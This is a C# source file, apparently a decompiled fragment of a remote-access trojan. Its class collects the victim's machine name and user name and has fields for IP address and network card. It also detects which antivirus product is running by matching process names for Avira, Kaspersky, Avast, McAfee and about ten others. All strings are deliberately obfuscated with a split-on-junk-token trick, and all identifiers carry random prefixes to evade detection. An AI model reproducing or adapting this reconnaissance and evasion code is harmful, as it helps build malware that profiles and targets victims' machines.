using System;
using System.Diagnostics;

namespace camsars;

public class romwckoMYINF
{
	public string romwckolancard = "";

	public string romwckouip = "";

	public string romwckocname = "";

	public string romwckoantiv = "";

	public string romwckouname = "";

	public string romwckoapver;

	public string romwckoloadAV()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				string processName = processes[i].ProcessName;
				switch ("romwcko-!romwcko".Split(new char[1] { '!' })[0] + processName)
				{
				case "romwcko-avgnt":
					text += "[Avira] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-spbbcsvc":
					text += "[Symantec] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-msmpeng":
				case "romwcko-msseces":
					text += "[Microsoft-Security-Essentials] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-fssm32":
					text += "[FSecure] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-avgui":
				case "romwcko-avgcc":
					text += "[AVG!romwcko] ".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-updaterui":
					text += "[McAfee] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-fpavserver":
					text += "[FProt] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-mbam":
					text += "[Ant-Malware] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-bdss":
					text += "[BitDefender] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-ekrn":
					text += "[NOD32] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-bdagent":
					text += "[BitDefenderAgent] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-avp":
					text = "[Kaspersky] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-ONLINENT":
				case "romwcko-onlinent":
					text += "[QuickHeal] !romwcko".Split(new char[1] { '!' })[0];
					break;
				case "romwcko-AvastUI":
				case "romwcko-avastui":
				case "romwcko-avast":
					text += "[Avast] !romwcko".Split(new char[1] { '!' })[0];
					break;
				}
			}
			if (text == "")
			{
				text = "Not-Found!romwcko".Split(new char[1] { '!' })[0];
			}
			romwckoantiv = text;
			return text;
		}
		catch
		{
			return "";
		}
	}

	public romwckoMYINF()
	{
		romwckoInfo();
	}

	private void romwckoInfo()
	{
		romwckoapver = "1.0.0.0";
		romwckoloadAV();
		romwckocname = Environment.MachineName;
		romwckouname = Environment.UserName;
	}
}
